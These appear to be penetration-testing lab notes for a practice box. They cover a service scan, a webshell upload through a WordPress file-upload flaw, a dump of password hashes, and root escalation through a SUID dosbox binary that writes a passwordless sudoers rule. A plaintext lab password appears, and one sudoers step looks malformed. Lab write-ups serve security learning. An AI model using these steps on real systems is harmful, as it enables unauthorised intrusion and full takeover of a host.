# Box: 192.168.150.105

---

## System Info
- **IP:** 192.168.150.105  
- **OS/Tech:** Ubuntu, Apache 2.4.46 (PHP 7.4.10), MariaDB 10.3, Python 3.8.5 (Werkzeug 1.0.1), Nginx 1.18.0, Samba smbd 4

---

## Credentials
- **User:** `commander`  
- **Password:** CommanderKeenVorticons1990

---

## Service Enumeration (`nmap -sC -sV`)
| Port     | State | Service    | Version                                     |
|----------|-------|------------|---------------------------------------------|
| **22**   | open  | ssh        | OpenSSH 8.3                                 |
| **80**   | open  | http       | Apache 2.4.46 (PHP 7.4.10) — WordPress + Simple File List v4.2.2 |
| **5000** | open  | http       | Werkzeug/1.0.1 Python/3.8.5                 |
| **13000**| open  | http       | Nginx 1.18.0 (admin/admin login)            |
| **36445**| open  | netbios-ssn| Samba smbd 4 (anonymous)                    |
| **3306** | open  | mysql      | MariaDB 10.3 (unauthorized)                 |

---

## Initial Exploits

### 1. WordPress Plugin: Simple File List v4.2.2
- **Path:** `/wp-content/plugins/simple-file-list/`  
- **Vuln:** Arbitrary file upload  
- **Exploit:** Upload `shell.php` → get shell as `www-data`

### 2. WP Config & Database
- **Locate** `wp-config.php` for DB credentials  
- **Dump** `wp_users`:
  ```sql
  SELECT ID, user_login, user_pass FROM wp_users;
  ```
  | ID | user_login | user_pass                          |
  |----|------------|------------------------------------|
  | 1  | admin      | $P$BoktR9dJnCOMHiLEnYkPfS1Ae/7vPq/ |

- **Hash** not cracked via John (`--format=phpass`).

---

## Post-Exploitation

### VNC Access
- **VNC** on `127.0.0.1:5901` (no display on box)  
- **Port forward**:
  ```bash
  ssh -4 -f -N -L 5901:127.0.0.1:5901 commander@192.168.150.105
  ```
- **Connect**:
  ```bash
  vncviewer localhost:5901
  ```

### Privilege Escalation via SUID `dosbox`
- **Binary:** `/usr/bin/dosbox` (SUID root)  
- **GTFOBins**: use autoexec to launch host shell  

#### Steps
1. In VNC terminal, create `/tmp/dos.conf`:
   ```ini
   [autoexec]
   shell
   ```
2. Run:
   ```bash
   /usr/bin/dosbox -conf /tmp/dos.conf
   ```
3. At `Z:\>` prompt, mount and edit sudoers:
   ```dos
   mount C /etc
   C:
   EOF > sudoers
   echo "commander ALL=(ALL) NOPASSWD: ALL" >> sudoers
   ```
4. Back in Linux shell:
   ```bash
   sudo su
   whoami  # → root
   ```

---
